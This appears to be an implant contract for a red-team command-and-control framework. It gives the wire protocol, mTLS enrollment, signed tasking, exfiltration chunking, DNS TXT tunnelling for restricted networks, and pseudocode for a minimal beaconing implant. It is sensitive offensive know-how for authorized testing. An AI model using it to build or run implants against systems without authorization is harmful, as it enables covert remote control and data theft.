# Rod -- Implant contract

The compliance ladder and wire reference for a from-scratch implant. The wire
protocol is the product (architecture.md Sec 4.2, Sec 12.2): any language that
can speak it can be a Rod implant. This file defines what "speak it" minimally
means, every byte-level shape an implant author needs, what is optional
hardening, and the rules that keep the minimum small while the platform grows.
The reference .NET implant (`src/implant/dotnet/`) implements every tier; it
is the worked example, not the obligation.

The contract sources are `src/teamserver/Rod.Protocol/protos/rod.proto` (the
authoritative wire messages -- compile it with your own toolchain), this wire
reference, and the baked build profile a build unit emits. Everything here is
verified against the teamserver code; where behavior differs, rod.proto and
the code win and this file is a bug.

## Wire reference

### Endpoints

A deployment exposes two implant-facing endpoints (listener configuration,
architecture.md Sec 8):

| Purpose | Transport | Route |
|---------|-----------|-------|
| Enroll | Plain HTTP(S), anonymous | `POST /implants/enroll` |
| Beacon / tasking | gRPC over mutual TLS | `/rod.v1.Beacon/CheckIn` |

The enroll listener accepts plain JSON with no client certificate -- the
implant authenticates with the one-use stager token, not a cert it does not
have yet. The beacon listener requires a client certificate that chains to
the engagement CA; enrollment is what mints it.

### TLS shape

- **Beacon client certificate:** the leaf issued at enroll, paired with the
  implant's own private key. It binds `(implant_id, engagement_id)` -- the
  server's authoritative identity check is "the cert's engagement equals the
  enrolled implant's engagement" (architecture.md Sec 9).
- **Server identity:** the teamserver presents the engagement CA certificate
  itself as its server identity (it carries no SANs). Pin **chain-to-CA**, not
  DNS names: build the chain with the enrolled CA chain in the trust store,
  allow the unknown-CA error, then require the chain root's fingerprint to
  equal one of the enrolled CA certificates. This mirrors what the reference
  client does (`C2.PinServerChain`).

### Enrollment

`POST /implants/enroll`, `Content-Type: application/json`, camelCase JSON:

```json
{
  "stagerTokenSecret": "<the one-use secret the operator minted>",
  "publicKey": "<base64 DER SubjectPublicKeyInfo of your RSA-2048 public key>",
  "class": "Stage2",
  "parentImplantId": null
}
```

`publicKey` is what makes the implant own its identity: submit the public
half, keep the private half, and the returned leaf is signed over your key.
`class` is optional (defaults `Stage2`); `parentImplantId` is set only by a
child derivation (`lateral.move`). A malleable profile may wrap the whole JSON
body as a single base64 JSON string (the profile's base64 envelope) -- the
teamserver accepts both shapes.

Response `200 OK`:

```json
{
  "status": 1,
  "implantId": "<guid>",
  "engagementId": "<guid>",
  "leafCertificate": "<base64 DER leaf, signed over your public key>",
  "caChain": ["<base64 DER CA cert>"],
  "parentImplantId": null
}
```

`status` is the proto `EnrollStatus`: `1` OK, `2` bad token, `3` expired,
`4` spent. A token failure answers `401` with the status set and no
certificate material; a malformed body answers `400`. Bad/expired/spent are
**definitive** -- do not retry them. Transport failures (connection refused,
timeout) are worth retrying with exponential backoff.

### The CheckIn stream

One bidirectional gRPC stream, method `/rod.v1.Beacon/CheckIn`, protobuf
messages defined in rod.proto. The unit that crosses the stream is `Frame`:
an opaque `payload` plus, upstream only, a `kind` discriminator. The server's
message cap is 2 MiB per frame; keep a single payload near or under 1 MiB and
chunk anything larger.

**Frame order:**

1. The implant speaks first: one `Frame` whose payload is a `HandshakeRequest`
   (protocol version `1.0`, the implant id, the advertised verb list).
2. The server answers with one `Frame` whose payload is a `HandshakeResponse`.
   `status` must be `1` (`OK`); anything else is **permanent for this
   artifact** -- terminate rather than retry:
   `2` version mismatch, `3` unknown implant, `4` identity mismatch,
   `5` kill date expired, `6` implant retired.
3. Thereafter the stream carries tasking downstream (`TaskRequest` payloads,
   no kind set -- discriminate positionally after the handshake) and results
   upstream (`TaskResult` with `kind = FRAME_KIND_TASK_RESULT`, `ExfilChunk`
   with `kind = FRAME_KIND_EXFIL_CHUNK`, `StagedPull` with
   `kind = FRAME_KIND_STAGED_PULL`). An upstream frame with `kind`
   unset is tolerated as a `TaskResult` (legacy shape).

**Using the stream:** hold it open for the session (stream mode -- the
interactive shape, server pushes tasking the moment it is queued) or run
check-in cycles (poll mode -- drain queued tasking, half-close, wait for the
server to end the stream, sleep the baked interval with jitter, reconnect and
re-handshake). Both are Tier 0; the server treats them identically and reuses
the implant's session across reconnects.

### Task results and bulk data

A `TaskResult` echoes the task id with an outcome (`1` succeeded, `2` failed)
and an output string. Bulk data (file contents, large captures) does **not**
ride the output string: emit `ExfilChunk` frames after the `TaskResult`, each
carrying the task id, an artifact name, a MIME content type, a 0-origin
sequence, and a terminal flag on the last one. The teamserver reassembles
strictly by sequence into the engagement artifact store. Keep chunks at or
under 512 KiB.

### Staged uploads (downstream bulk)

A `TaskRequest` whose `staged_bytes` field is set carries its bulk payload
server-side, not in the arguments string: the arguments end with a
`sha256:<hex>` token -- part of the signed tuple, so the payload is exactly as
tamper-evident as an inline one -- and the bytes must be demanded before the
task reports a result. Send one `Frame` with `kind = FRAME_KIND_STAGED_PULL`
and a `StagedPull{task_id}` payload; the server answers on the same stream with
a run of `StagedChunk` frames (`task_id` echo, 0-origin sequence, terminal on
the last, 512 KiB data slices). Reassemble, verify the sha256 against the
arguments token, then run the verb against the reassembled bytes and report the
`TaskResult` as usual. Nothing bulk ever flows downstream unasked.

### DNS check-ins (Tier 2, the egress-restricted transport)

A DNS listener entry answers TXT queries over UDP under its zone (the entry's
public endpoint). The check-in grammar encodes into the query NAME as lowercase
RFC 4648 base32 labels, no padding:

```
poll:          p.<b32(implant id)>.<zone>
result chunk:  r.<b32(task id)>.<s|f>.<seq>.<t|m>.<b32(chunk)>.<b32(implant id)>.<zone>
```

A poll is answered with zero or one TXT record whose strings concatenate to
the base32 of a signed `TaskRequest` (verify it exactly like a stream-delivered
one -- the signature covers the canonical tuple); an empty answer means no
tasking. A result is reported as chunked queries (0-origin `seq`, `t` terminal
or `m` more, UTF-8 chunks; an empty chunk rides as the bare label `e`),
answered with an empty NOERROR. Send EDNS0 (the answers ride up to 1232
bytes); short-argument tasking only -- a task that does not fit is not
delivered over DNS.

The transport's identity tradeoff is deliberate: no handshake and no mTLS ride
DNS. An implant is identified by its id alone, and its session must have been
opened on a handshake-capable transport first -- DNS refreshes presence
(`last-seen`), it does not create sessions. Downstream tasking keeps the full
Tier 1 posture: verify the signature before executing anything received over
DNS.

### Tasking signature verification (Tier 1, recommended)

Every dispatched `TaskRequest` carries an RSASSA-PSS/SHA-256 signature made by
the tasking CA -- the same CA whose chain the implant holds from enrollment.
Verify before executing; report a failure as a `Failed` task rather than
running anything. The signed bytes are a fixed canonical encoding (NOT the
serialized message), so every language verifies identically:

```
canonical = ""
for value in [my_own_implant_id, task.task_id, task.verb, task.arguments]:
    bytes   = utf8(value)
    canonical += uint32_little_endian(len(bytes)) + bytes
verify RSASSA-PSS(SHA-256) over canonical with each RSA-bearing CA public key
```

The implant id in the tuple is the **verifier's own** id, not a wire field:
tasking signed for another implant fails verification on yours, so captured
tasking cannot be replayed cross-implant.

## Tier 0 -- Interop (required)

The smallest implant that enrolls, checks in, and executes tasking:

1. **Enroll.** Generate an RSA-2048 key pair. POST the public key with the
   stager token. Receive the ids, the leaf, and the CA chain. Keep the private
   key; never transmit it.
2. **Beacon.** Open `/rod.v1.Beacon/CheckIn` over mTLS with the leaf.
3. **Handshake.** Send the `HandshakeRequest` first; require OK; treat every
   other status as permanent.
4. **Task loop.** Parse each downstream `TaskRequest`, execute its verb
   against its opaque argument string, and write a `TaskResult` echoing the
   task id. The verb grammar belongs to the implant's own handlers; the server
   gates verbs, it does not parse arguments.

In pseudocode, the whole obligation:

```
key    = rsa_2048()
enroll = post_json("https://teamserver/implants/enroll",
                   {"stagerTokenSecret": token,
                    "publicKey": b64(key.spki_der)})
leaf   = cert(enroll.leafCertificate) paired with key
cas    = [cert(b) for b in enroll.caChain]

forever:
    stream = grpc_connect("teamserver:port", mTLS(leaf, trust = chain_to(cas)))
    send Frame(payload = HandshakeRequest{1, 0, enroll.implantId, my_verbs})
    if HandshakeResponse.parse(recv()).status != OK: exit

    while task = TaskRequest.parse(next_downstream_frame()):
        if not verify_tasking(cas, task, my_id = enroll.implantId):
            send Frame(TASK_RESULT, TaskResult{task.id, Failed, "rejected"}); continue
        outcome, output, chunks = my_handlers[task.verb](task.arguments)
        send Frame(TASK_RESULT, TaskResult{task.id, outcome, output})
        for c in chunks: send Frame(EXFIL_CHUNK, c)

    # stream mode: the while loop blocks on the next downstream frame.
    # poll mode: after a short idle with no frame, close the stream,
    # sleep(baked_sleep +/- baked_jitter/2), and reconnect.
```

An implant that stops here interoperates fully: it appears on the roster, is
taskable, and its results and audit trail are indistinguishable from the
reference implant's.

## Tier 1 -- Hardening (the implant author's choice)

Each item hardens the implant with no server-side counterpart requirement --
the server cannot observe whether an implant adopted any of them:

- **Tasking signature verification.** As specified above. Skipping it leaves
  the implant trusting the channel (the pre-signing posture,
  architecture.md Sec 9).
- **Kill date.** Refuse to start past the baked kill date and re-check it
  each cycle. The teamserver refuses handshakes past it regardless; the local
  check bounds a lost implant that can no longer reach any server.
- **Beacon discipline.** The baked sleep with jitter, and exponential backoff
  on consecutive failures, so a down teamserver is not polled at beacon rate.
  The check-in mode is the implant's choice on the same stream contract.

## Tier 2 -- Optional features

Adopt per deployment need; absence degrades the feature, not interop:

- **Exfil chunking** -- `ExfilChunk` frames stream bulk data into the
  artifact store.
- **Staged uploads** -- the `StagedPull`/`StagedChunk` demand path streams a
  staged task's bulk payload downstream (architecture.md Sec 10, the
  per-verb typed arm). An implant without it still receives staged tasks;
  it ignores the unknown `staged_bytes` field and fails the verb on its own
  argument grammar, and no chunk frame ever arrives unasked.
- **DNS check-ins** -- the TXT-query grammar above, for egress-restricted
  targets where only DNS leaves the network. Absence is graceful: an implant
  without it simply beacons over the stream transports.
- **Malleable enroll presentation** -- the baked URI path, User-Agent,
  headers, timeout, and base64 body envelope shape the enroll request.
- **Child derivation** -- the parent-naming enroll flow behind
  `lateral.move` (architecture.md Sec 5.2).

## Evolution rules

These rules bind every future protocol change; they are what keeps Tier 0
from quietly growing:

1. **Additive only.** New fields take new field numbers; numbers are never
   reused or repurposed. Unknown fields and enum values are ignored, never
   errors. A newer server must serve a Tier 0 implant unchanged.
2. **No new mandatory work on the task path.** A protocol addition that
   would require every implant to implement new cryptography or new
   processing to keep interoperating must instead be negotiated (a handshake
   capability) with a fallback to the existing shape, or it does not ship.
3. **Every addition lands in a tier.** A change to this file accompanies any
   change to rod.proto: the change states its tier and what a Tier 0 implant
   does about it (the usual answer: nothing). The staged-upload arm
   (`TaskRequest.staged_bytes`, `StagedPull`, `StagedChunk`) is the worked
   example: Tier 2, negotiated implicitly by demand -- a Tier 0 implant
   ignores the unknown field, never receives a chunk frame, and fails the
   verb on its own grammar.
4. **Weight stays server-side.** Capability reach grows in the teamserver,
   the tradecraft modules, and the build pipeline -- not in the minimum an
   implant must carry (architecture.md Sec 14).

## Calibration note

Tier 0's heaviest piece today is the gRPC/HTTP-2 channel, not the crypto or
the messages. The recorded escape hatch is a plain-HTTP-envelope listener
(architecture.md Sec 8): the same rod.v1 frames carried as delimited
sequences in ordinary HTTP request/response bodies over the same client
certificates, dropping the gRPC requirement without changing the protocol
semantics -- one POST becomes one poll check-in. It is scheduled on the todo
list; until it ships, an implant needs a gRPC stack (or hand-rolled HTTP/2,
which the framing above makes mechanical).
